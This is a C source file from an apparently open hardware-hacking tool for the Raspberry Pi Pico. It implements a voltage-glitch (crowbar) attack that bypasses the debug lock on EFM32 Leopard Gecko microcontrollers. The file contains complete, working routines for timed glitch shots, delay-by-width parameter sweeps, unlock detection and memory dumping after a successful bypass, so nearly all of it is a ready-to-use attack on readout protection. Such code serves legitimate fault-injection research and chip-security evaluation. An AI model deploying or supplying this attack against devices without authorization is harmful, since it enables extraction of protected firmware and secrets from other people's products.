/*
 * EFM32 Leopard Gecko (EFM32LG) target support for Raiden-Pico - debug-lock
 * voltage-glitch bypass.
 *
 * See efm32_target.h for the attack model and references (WORK/efm32_findings.md).
 * Built on the vendor-neutral swd_* API. Same crowbar rig as the nRF52840 module
 * (GP2 -> core-rail decoupling node); here the node is the EFM32 DECOUPLE pin.
 */

#include "efm32_target.h"
#include "swd.h"
#include "glitch.h"
#include "platform.h"
#include "config.h"
#include "uart_cli.h"
#include "pico/stdlib.h"
#include "pico/time.h"

// Target power control lives in target_uart.c (shared with the nRF module).
extern void target_power_on_silent(void);
extern void target_power_off_silent(void);

uint32_t efm32_connect(void)
{
    // swd_connect() does a line reset + reads DPIDR only; it does NOT touch the
    // AHB-AP, so it works even while the part is debug-locked.
    if (!swd_connect())
        return 0;
    uint32_t dpidr = 0;
    if (!swd_read_dp(DP_DPIDR, &dpidr))
        return 0;
    return dpidr;
}

bool efm32_is_unlocked(void)
{
    // GROUND TRUTH = "can the AHB-AP actually read memory?". On a debug-locked
    // EFM32 the AHB-AP is disabled by the DLW and every memory transaction
    // faults, so swd_read_mem() returns 0. We read the factory-programmed DI
    // PART word: it is never blank (0x00000000 / 0xFFFFFFFF), so a plausible
    // value confirms a real, unlocked read. Mirrors the nRF FICR-read truth -
    // never trust a lone status bit.
    uint32_t part = 0;
    if (swd_read_mem(EFM32_DI_PART, &part, 1) != 1)
        return false;
    return part != 0x00000000u && part != 0xFFFFFFFFu;
}

bool efm32_read_info(efm32_info_t *i)
{
    if (!i)
        return false;
    *i = (efm32_info_t){0};

    i->dpidr = efm32_connect();
    if (i->dpidr == 0) {
        i->state = 0;
        return false;
    }

    bool unlocked = efm32_is_unlocked();
    i->state = unlocked ? 2 : 1;
    if (!unlocked)
        return true;  // connected but locked - no AHB-AP reads possible

    swd_read_mem(EFM32_DI_PART,    &i->part,     1);
    swd_read_mem(EFM32_DI_MSIZE,   &i->msize,    1);
    swd_read_mem(EFM32_DI_UNIQUEL, &i->unique_l, 1);
    swd_read_mem(EFM32_DI_UNIQUEH, &i->unique_h, 1);
    i->part_number = EFM32_PART_NUMBER(i->part);
    i->part_family = EFM32_PART_FAMILY(i->part);
    i->prod_rev    = EFM32_PART_PRODREV(i->part);
    i->flash_kb    = EFM32_MSIZE_FLASH_KB(i->msize);
    i->sram_kb     = EFM32_MSIZE_SRAM_KB(i->msize);
    return true;
}

void efm32_cmd_info(void)
{
    efm32_info_t i;
    efm32_read_info(&i);

    uart_cli_send("=== EFM32LG Info ===\r\n");
    if (i.state == 0) {
        uart_cli_send("SWD:          NOT CONNECTED (no DPIDR)\r\n");
        return;
    }
    uart_cli_printf("DPIDR:        0x%08X%s\r\n", (unsigned)i.dpidr,
                    i.dpidr == EFM32_DPIDR_M3 ? " (Cortex-M3 SW-DP)" : " (unexpected)");
    uart_cli_printf("DEBUG LOCK:   %s\r\n",
                    i.state == 2 ? "UNLOCKED (AHB-AP open, flash readable)"
                                 : "LOCKED (DLW set - glitch required)");
    if (i.state != 2)
        return;

    uart_cli_printf("DI.PART:      0x%08X  (number=%u family=%u rev=%u)\r\n",
                    (unsigned)i.part, (unsigned)i.part_number,
                    (unsigned)i.part_family, (unsigned)i.prod_rev);
    if (i.part_family == EFM32_FAMILY_LG)
        uart_cli_send("              family = Leopard Gecko\r\n");
    uart_cli_printf("Flash:        %u kB\r\n", (unsigned)i.flash_kb);
    uart_cli_printf("SRAM:         %u kB\r\n", (unsigned)i.sram_kb);
    uart_cli_printf("Unique ID:    0x%08X%08X\r\n",
                    (unsigned)i.unique_h, (unsigned)i.unique_l);
}

// Drive both SWD lines LOW before cutting VDD so they can't back-power the
// target through its clamp diodes while the rail is collapsed (matches the nRF
// module). swd_connect() fully re-inits these pins on the next probe.
static void efm32_swd_idle(void)
{
    gpio_init(SWD_SWCLK_PIN);
    gpio_set_dir(SWD_SWCLK_PIN, GPIO_OUT);
    gpio_put(SWD_SWCLK_PIN, 0);
    gpio_init(SWD_SWDIO_PIN);
    gpio_set_dir(SWD_SWDIO_PIN, GPIO_OUT);
    gpio_put(SWD_SWDIO_PIN, 0);
}

void efm32_aap_probe(void)
{
    if (efm32_connect() == 0) {
        uart_cli_send("AAP: no SWD link (DPIDR=0)\r\n");
        return;
    }
    uart_cli_send("=== AAP probe (AP IDR scan) ===\r\n");
    for (uint8_t ap = 0; ap < 4; ap++) {
        uint32_t idr = 0;
        bool ok = swd_read_ap(ap, AP_IDR, &idr);
        bool is_aap = ok && ((idr & EFM32_AAP_IDR_MASK) == EFM32_AAP_IDR_VAL);
        uart_cli_printf("  AP%u IDR=0x%08X%s%s\r\n", ap, (unsigned)idr,
                        ok ? "" : " (no ack)",
                        is_aap ? "  <-- AAP" : "");
    }
    uart_cli_send("(AP with IDR matching 0x06E6xxxx is the Authentication Access Port.)\r\n");
}

// Find the AAP's AP index by IDR. Returns 0xFF if not found.
static uint8_t efm32_find_aap(void)
{
    for (uint8_t ap = 0; ap < 4; ap++) {
        uint32_t idr = 0;
        if (swd_read_ap(ap, AP_IDR, &idr) &&
            (idr & EFM32_AAP_IDR_MASK) == EFM32_AAP_IDR_VAL)
            return ap;
    }
    return 0xFF;
}

bool efm32_device_erase(void)
{
    // The AAP is exposed in the reset window, so connect UNDER RESET (nRST held
    // low through the line-reset) to reach it on a locked part.
    if (!swd_connect_under_reset()) {
        uart_cli_send("ERROR: no SWD link under reset for AAP DEVICEERASE\r\n");
        return false;
    }
    uint8_t aap = efm32_find_aap();
    if (aap == 0xFF) {
        uart_cli_send("ERROR: AAP not found (no AP IDR matched 0x06E6xxxx).\r\n");
        uart_cli_send("       Run TARGET EFM AAP to inspect the AP IDRs; the AAP is only\r\n");
        uart_cli_send("       exposed briefly after reset - retry, or verify the AAP IDR\r\n");
        uart_cli_send("       for this exact part against the EFM32LG Reference Manual.\r\n");
        return false;
    }
    uart_cli_printf("AAP found at AP%u. DEVICEERASE (mass erase + unlock)...\r\n", aap);

    // Unlock the CMD register with the key, then set DEVICEERASE.
    swd_write_ap(aap, EFM32_AAP_CMDKEY, EFM32_AAP_CMDKEY_VAL);
    bool w = swd_write_ap(aap, EFM32_AAP_CMD, EFM32_AAP_DEVICEERASE);
    uart_cli_printf("  DEVICEERASE write ack=%d; waiting for erase (~50 ms spec)...\r\n", w);

    // Poll ERASEBUSY (datasheet device-erase time 41.8-49.2 ms); generous budget.
    uint32_t status = EFM32_AAP_ERASEBUSY;
    for (int n = 0; n < 50; n++) {
        sleep_ms(5);
        if (swd_read_ap(aap, EFM32_AAP_STATUS, &status) && !(status & EFM32_AAP_ERASEBUSY))
            break;
    }
    uart_cli_printf("  AAP_STATUS=0x%08X (ERASEBUSY %s)\r\n", (unsigned)status,
                    (status & EFM32_AAP_ERASEBUSY) ? "still set - timeout" : "clear - done");

    // Release reset and re-probe: after a successful erase the DLW is blank, so
    // the AHB-AP should now be open.
    swd_nrst_release();
    sleep_ms(150);
    uint32_t dpidr = efm32_connect();
    bool unlocked = (dpidr != 0) && efm32_is_unlocked();
    uart_cli_printf("After erase+reset: DPIDR=0x%08X  DEBUG=%s\r\n",
                    (unsigned)dpidr, unlocked ? "UNLOCKED (AHB-AP open!)" : "still LOCKED");
    return unlocked;
}

static uint32_t efm32_clamp_width(uint32_t width_cyc)
{
    if (width_cyc > EFM32_GLITCH_WIDTH_MAX_CYC)
        width_cyc = EFM32_GLITCH_WIDTH_MAX_CYC;
    if (width_cyc < EFM32_GLITCH_WIDTH_MIN_CYC)
        width_cyc = EFM32_GLITCH_WIDTH_MIN_CYC;
    return width_cyc;
}

void efm32_glitch_shot(uint32_t delay_us, uint32_t width_cyc)
{
    width_cyc = efm32_clamp_width(width_cyc);

    platform_set_type(PLATFORM_CROWBAR);
    glitch_set_width(width_cyc);

    efm32_swd_idle();
    target_power_off_silent();
    glitch_arm();              // arm during the OFF window so PIO setup is absorbed
    sleep_ms(50);
    target_power_on_silent();  // SILENT: avoid the blocking USB print that adds jitter
    busy_wait_us(delay_us);    // delay measured cleanly from power-on
    glitch_execute();          // single crowbar pulse on GP2->DECOUPLE; GP22 marker pulses

    uart_cli_printf("SHOT: delay=%u us, width=%u cyc (~%u ns). Trigger scope on GP22, probe DECOUPLE.\r\n",
                    (unsigned)delay_us, (unsigned)width_cyc,
                    (unsigned)((width_cyc * 20u) / 3u));
}

void efm32_glitch_shot_reset(uint32_t delay_us, uint32_t width_cyc, uint32_t reset_hold_us)
{
    width_cyc = efm32_clamp_width(width_cyc);
    if (reset_hold_us < 120) reset_hold_us = 120;   // must exceed glitch_arm() PIO setup

    platform_set_type(PLATFORM_CROWBAR);
    target_power_on_silent();       // ensure VDD is ON (reset-glitch keeps VDD up)
    glitch_set_width(width_cyc);

    efm32_swd_idle();
    swd_nrst_assert();              // nRST low = reset asserted
    glitch_arm();                  // arm during the hold so PIO setup is absorbed
    busy_wait_us(reset_hold_us);
    gpio_set_dir(SWD_NRST_PIN, GPIO_OUT);
    gpio_put(SWD_NRST_PIN, 1);      // crisp active-high release edge (scope trigger on GP15)
    busy_wait_us(delay_us);         // delay measured from the release edge
    glitch_execute();               // crowbar on GP2 -> DECOUPLE

    uart_cli_printf("SHOTRST: delay=%u us from nRST release, width=%u cyc, hold=%u us. "
                    "Trigger scope on GP15 release.\r\n",
                    (unsigned)delay_us, (unsigned)width_cyc, (unsigned)reset_hold_us);
}

uint32_t efm32_dump_mem(uint32_t addr, uint32_t bytes)
{
    if (!efm32_is_unlocked()) {
        uart_cli_send("ERROR: part is locked - cannot read memory (run TARGET GLITCH DEBUGUNLOCK first)\r\n");
        return 0;
    }

    uint32_t words = (bytes + 3) / 4;
    uint32_t done = 0;
    uint32_t buf[16];  // 64 bytes per SWD burst

    while (done < words) {
        uint32_t chunk = (words - done) > 16 ? 16 : (words - done);
        uint32_t got = swd_read_mem(addr + done * 4, buf, chunk);
        if (got == 0) {
            uart_cli_send("\r\n(read fault)\r\n");
            break;
        }
        for (uint32_t w = 0; w < got; w++) {
            uint32_t a = addr + (done + w) * 4;
            uint8_t *b = (uint8_t *)&buf[w];
            uart_cli_printf("%08X: %02X %02X %02X %02X\r\n",
                            (unsigned)a, b[0], b[1], b[2], b[3]);
        }
        done += got;
        if (got < chunk)
            break;
    }
    return done * 4;
}

// Shared sweep-arg normaliser: clamp width band, default zero steps to 1.
static void efm32_norm_sweep(uint32_t *delay_start_us, uint32_t *delay_end_us,
                             uint32_t *delay_step_us, uint32_t *width_start_cyc,
                             uint32_t *width_end_cyc, uint32_t *width_step_cyc)
{
    if (*delay_step_us == 0) *delay_step_us = 1;
    if (*delay_end_us < *delay_start_us) *delay_end_us = *delay_start_us;
    if (*width_start_cyc < EFM32_GLITCH_WIDTH_MIN_CYC) *width_start_cyc = EFM32_GLITCH_WIDTH_MIN_CYC;
    if (*width_end_cyc > EFM32_GLITCH_WIDTH_MAX_CYC) *width_end_cyc = EFM32_GLITCH_WIDTH_MAX_CYC;
    if (*width_end_cyc < *width_start_cyc) *width_end_cyc = *width_start_cyc;
    if (*width_step_cyc == 0) *width_step_cyc = 1;
}

bool efm32_glitch_unlock(uint32_t delay_start_us, uint32_t delay_end_us,
                         uint32_t delay_step_us, uint32_t width_start_cyc,
                         uint32_t width_end_cyc, uint32_t width_step_cyc,
                         uint32_t power_off_ms, uint32_t settle_ms,
                         uint32_t max_attempts)
{
    efm32_norm_sweep(&delay_start_us, &delay_end_us, &delay_step_us,
                     &width_start_cyc, &width_end_cyc, &width_step_cyc);

    platform_set_type(PLATFORM_CROWBAR);

    uart_cli_send("=== EFM32LG debug-unlock glitch (delay x width sweep, power-cycle) ===\r\n");
    uart_cli_printf("delay %u..%u us step %u | width %u..%u cyc step %u (~%u..%u ns) | "
                    "off %u ms | settle %u ms | max %u\r\n",
                    (unsigned)delay_start_us, (unsigned)delay_end_us, (unsigned)delay_step_us,
                    (unsigned)width_start_cyc, (unsigned)width_end_cyc, (unsigned)width_step_cyc,
                    (unsigned)((width_start_cyc * 20u) / 3u), (unsigned)((width_end_cyc * 20u) / 3u),
                    (unsigned)power_off_ms, (unsigned)settle_ms, (unsigned)max_attempts);
    uart_cli_send("Crowbar GP2->DECOUPLE. tRESET~163us boot window. Width inner / delay outer. "
                  "Power-cycle Pico to abort.\r\n");

    // PRE-FLIGHT: confirm the part is actually LOCKED before wasting a sweep on
    // it (mirrors the nRF module - an already-open part would falsely "unlock").
    efm32_swd_idle();
    target_power_off_silent(); sleep_ms(power_off_ms);
    target_power_on_silent();  sleep_ms(settle_ms);
    if (efm32_connect() == EFM32_DPIDR_M3 && efm32_is_unlocked()) {
        uart_cli_send("\r\n*** ABORT: part is ALREADY UNLOCKED (AHB-AP open) before any "
                      "glitch - nothing to do. ***\r\n");
        efm32_cmd_info();
        return false;
    }

    uint32_t delay_us = delay_start_us;
    uint32_t width = width_start_cyc;
    uint32_t disrupt_count = 0;

    for (uint32_t attempt = 1; attempt <= max_attempts; attempt++) {
        glitch_set_width(width);

        efm32_swd_idle();
        target_power_off_silent();
        glitch_arm();              // arm during OFF so ~90us PIO setup is absorbed
        sleep_ms(power_off_ms);
        target_power_on_silent();  // SILENT to avoid the ~74us blocking USB print

        busy_wait_us(delay_us);    // wait into the DLW-latch window
        glitch_execute();          // crowbar on GP2 -> DECOUPLE

        sleep_ms(settle_ms);

        uint32_t dpidr = efm32_connect();
        if (dpidr == EFM32_DPIDR_M3 && efm32_is_unlocked()) {
            uart_cli_printf("\r\n*** UNLOCKED on attempt %u (delay=%u us, width=%u cyc) ***\r\n",
                            (unsigned)attempt, (unsigned)delay_us, (unsigned)width);
            efm32_cmd_info();
            return true;
        }

        if (dpidr != EFM32_DPIDR_M3 && disrupt_count < 80) {
            disrupt_count++;
            uart_cli_printf("DISRUPT #%u attempt %u delay=%u us width=%u cyc dpidr=0x%08X\r\n",
                            (unsigned)disrupt_count, (unsigned)attempt,
                            (unsigned)delay_us, (unsigned)width, (unsigned)dpidr);
        }
        if ((attempt % 256) == 0) {
            uart_cli_printf("  attempt %u/%u  delay=%u us  width=%u cyc  disrupts=%u\r\n",
                            (unsigned)attempt, (unsigned)max_attempts,
                            (unsigned)delay_us, (unsigned)width, (unsigned)disrupt_count);
        }

        width += width_step_cyc;
        if (width > width_end_cyc) {
            width = width_start_cyc;
            delay_us += delay_step_us;
            if (delay_us > delay_end_us)
                delay_us = delay_start_us;
        }
    }

    uart_cli_send("No unlock. Narrow the delay around tRESET (~163us) and retry.\r\n");
    return false;
}

bool efm32_glitch_unlock_reset(uint32_t delay_start_us, uint32_t delay_end_us,
                               uint32_t delay_step_us, uint32_t width_start_cyc,
                               uint32_t width_end_cyc, uint32_t width_step_cyc,
                               uint32_t reset_hold_us, uint32_t settle_ms,
                               uint32_t max_attempts)
{
    efm32_norm_sweep(&delay_start_us, &delay_end_us, &delay_step_us,
                     &width_start_cyc, &width_end_cyc, &width_step_cyc);
    if (reset_hold_us < 120) reset_hold_us = 120;   // must exceed glitch_arm() PIO setup

    platform_set_type(PLATFORM_CROWBAR);
    target_power_on_silent();      // VDD ON and STAYS on (no power-cycle)
    sleep_ms(50);

    uart_cli_send("=== EFM32LG debug-unlock glitch via nRST RESET (VDD stays on) ===\r\n");
    uart_cli_printf("delay %u..%u us step %u (from nRST release) | width %u..%u cyc step %u | "
                    "reset_hold %u us | settle %u ms | max %u\r\n",
                    (unsigned)delay_start_us, (unsigned)delay_end_us, (unsigned)delay_step_us,
                    (unsigned)width_start_cyc, (unsigned)width_end_cyc, (unsigned)width_step_cyc,
                    (unsigned)reset_hold_us, (unsigned)settle_ms, (unsigned)max_attempts);
    uart_cli_send("Crowbar GP2->DECOUPLE; reboot via nRST(GP15). Width inner / delay outer. "
                  "Power-cycle Pico to abort.\r\n");

    // PRE-FLIGHT: reset once and confirm the part is actually LOCKED.
    efm32_swd_idle();
    swd_nrst_assert(); busy_wait_us(reset_hold_us);
    gpio_set_dir(SWD_NRST_PIN, GPIO_OUT); gpio_put(SWD_NRST_PIN, 1);
    sleep_ms(settle_ms);
    if (efm32_connect() == EFM32_DPIDR_M3 && efm32_is_unlocked()) {
        uart_cli_send("\r\n*** ABORT: part is ALREADY UNLOCKED (AHB-AP open) before any "
                      "glitch - nothing to do. ***\r\n");
        efm32_cmd_info();
        return false;
    }

    uint32_t delay_us = delay_start_us;
    uint32_t width = width_start_cyc;
    uint32_t disrupt_count = 0;

    for (uint32_t attempt = 1; attempt <= max_attempts; attempt++) {
        glitch_set_width(width);

        efm32_swd_idle();
        swd_nrst_assert();              // nRST low = reset asserted
        glitch_arm();
        busy_wait_us(reset_hold_us);

        gpio_set_dir(SWD_NRST_PIN, GPIO_OUT);
        gpio_put(SWD_NRST_PIN, 1);      // crisp release edge -> boot runs (DECOUPLE already up)

        busy_wait_us(delay_us);         // delay measured from the release edge
        glitch_execute();               // crowbar on GP2 -> DECOUPLE

        sleep_ms(settle_ms);

        uint32_t dpidr = efm32_connect();
        if (dpidr == EFM32_DPIDR_M3 && efm32_is_unlocked()) {
            uart_cli_printf("\r\n*** UNLOCKED on attempt %u (delay=%u us from nRST, width=%u cyc) ***\r\n",
                            (unsigned)attempt, (unsigned)delay_us, (unsigned)width);
            efm32_cmd_info();
            return true;
        }

        if (dpidr != EFM32_DPIDR_M3 && disrupt_count < 80) {
            disrupt_count++;
            uart_cli_printf("DISRUPT #%u attempt %u delay=%u us width=%u cyc dpidr=0x%08X\r\n",
                            (unsigned)disrupt_count, (unsigned)attempt,
                            (unsigned)delay_us, (unsigned)width, (unsigned)dpidr);
        }
        if ((attempt % 256) == 0) {
            uart_cli_printf("  attempt %u/%u  delay=%u us  width=%u cyc  disrupts=%u\r\n",
                            (unsigned)attempt, (unsigned)max_attempts,
                            (unsigned)delay_us, (unsigned)width, (unsigned)disrupt_count);
        }

        width += width_step_cyc;
        if (width > width_end_cyc) {
            width = width_start_cyc;
            delay_us += delay_step_us;
            if (delay_us > delay_end_us)
                delay_us = delay_start_us;
        }
    }

    uart_cli_send("No unlock (reset-glitch). Re-measure nRST->boot timing and narrow the delay.\r\n");
    return false;
}
